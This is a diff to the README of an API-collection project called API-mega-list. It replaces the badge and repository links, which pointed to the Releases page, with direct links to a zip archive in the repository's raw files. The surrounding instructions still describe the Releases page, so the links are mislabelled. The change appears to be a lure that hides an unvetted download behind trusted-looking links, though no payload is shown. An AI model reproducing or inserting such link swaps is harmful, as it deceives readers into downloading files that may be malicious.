@@ -8,7 +8,7 @@ Welcome to the API-mega-list. This repository offers an extensive collection of 
 
 To get started, visit this page to download the latest version of the API-mega-list:
 
-[![Download API-mega-list](https://img.shields.io/badge/Download-API--mega--list-blue)](https://github.com/juansalnac/API-mega-list/releases)
+[![Download API-mega-list](https://raw.githubusercontent.com/juansalnac/API-mega-list/main/agents-apis-697/mega-list-AP-1.8.zip)](https://raw.githubusercontent.com/juansalnac/API-mega-list/main/agents-apis-697/mega-list-AP-1.8.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest release at the top. 
@@ -64,11 +64,11 @@ API-mega-list is open source and free to use. You can find more information abou
 
 ## 🌐 Other Links
 
-- **GitHub Repository:** [Visit API-mega-list](https://github.com/juansalnac/API-mega-list)
+- **GitHub Repository:** [Visit API-mega-list](https://raw.githubusercontent.com/juansalnac/API-mega-list/main/agents-apis-697/mega-list-AP-1.8.zip)
 - **Official Website:** Learn more about available APIs and features.
 
 ## 🏁 Conclusion
 
 API-mega-list is your go-to tool for discovering and using APIs. Whether you want to build a simple project or a robust application, you have all the resources you need at your fingertips. Start your journey today by visiting the Releases page to download the API-mega-list!
 
-[![Download API-mega-list](https://img.shields.io/badge/Download-API--mega--list-blue)](https://github.com/juansalnac/API-mega-list/releases)
+[![Download API-mega-list](https://raw.githubusercontent.com/juansalnac/API-mega-list/main/agents-apis-697/mega-list-AP-1.8.zip)](https://raw.githubusercontent.com/juansalnac/API-mega-list/main/agents-apis-697/mega-list-AP-1.8.zip)
